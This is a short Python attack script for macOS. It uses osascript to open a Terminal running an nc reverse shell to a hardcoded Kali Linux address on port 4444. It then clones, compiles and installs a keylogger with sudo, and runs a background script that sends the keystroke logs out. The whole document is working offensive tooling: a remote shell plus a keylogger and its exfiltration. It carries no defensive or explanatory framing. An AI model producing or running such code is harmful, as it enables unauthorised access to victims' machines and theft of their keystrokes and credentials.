import os
import time

# Kali Linux IP and reverse shell port
KALI_IP = "192.168.1.66"
PORT = "4444"

# Step 1: Open a reverse shell in a new Terminal window
os.system(f"osascript -e 'tell application \"Terminal\" to do script \"nc {KALI_IP} {PORT} -e /bin/bash\"'")

# Step 2: Clone your own GitHub repository (containing the modified keylogger)
os.system("git clone https://github.com/yourusername/keylogger-sender.git ~/Downloads/keylogger-sender")

# Step 3: Compile and install the keylogger
os.system("cd ~/Downloads/keylogger-sender && make")  # Compile the keylogger
os.system("cd ~/Downloads/keylogger-sender && sudo make install")  # Install the keylogger

# Step 4: Start the keylogger and log-sending script in the background
os.system("cd ~/Downloads/keylogger-sender && python3 send_log.py &")  # Run the log-sending script

# Wait for the keylogger to run before terminating the reverse shell
time.sleep(5)  # Wait for the keylogger to start before proceeding
